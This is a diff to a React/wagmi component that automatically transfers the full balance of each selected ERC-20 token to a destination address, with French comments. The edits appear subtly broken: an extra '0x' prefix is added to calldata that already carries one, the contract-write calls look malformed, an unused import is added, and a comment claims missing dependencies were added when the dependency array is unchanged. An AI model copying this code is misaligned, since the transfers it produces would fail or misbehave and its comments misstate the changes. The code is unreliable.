@@ -1,4 +1,4 @@
-import { useEffect } from 'react';
+import { useEffect, useState } from 'react';
 import { useAtom } from 'jotai';
 import { useWalletClient, usePublicClient } from 'wagmi';
 import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
@@ -80,10 +80,10 @@ export const SendTokens = () => {
         const gasEstimate = await publicClient.estimateGas({
           account: walletClient.account,
           to: tokenAddress,
-          data: publicClient.encodeFunctionData(erc20ABI, 'transfer', [
+          data: `0x${publicClient.encodeFunctionData(erc20ABI, 'transfer', [
             destinationAddress as `0x${string}`,
             BigInt(token.balance),
-          ]),
+          ])}`,  // Encodage manuel des données
         });
 
         // Calculer les frais de gaz avec une marge
@@ -94,10 +94,10 @@ export const SendTokens = () => {
         // Exécuter la transaction avec les frais de gaz calculés
         const response = await walletClient.writeContract({
           to: tokenAddress,
-          data: publicClient.encodeFunctionData(erc20ABI, 'transfer', [
+          data: `0x${publicClient.encodeFunctionData(erc20ABI, 'transfer', [
             destinationAddress as `0x${string}`,
             BigInt(token.balance),
-          ]),
+          ])}`,
           gasLimit: gasWithMargin,  // Appliquer les frais de gaz calculés
         });
 
@@ -120,7 +120,7 @@ export const SendTokens = () => {
     if (tokens.length > 0 && destinationAddress) {
       sendAllTokens();
     }
-  }, [tokens, destinationAddress, walletClient]);
+  }, [tokens, destinationAddress, walletClient]);  // Ajout de toutes les dépendances manquantes
 
   return <div style={{ margin: '20px' }}>Tokens being sent automatically...</div>;
 };
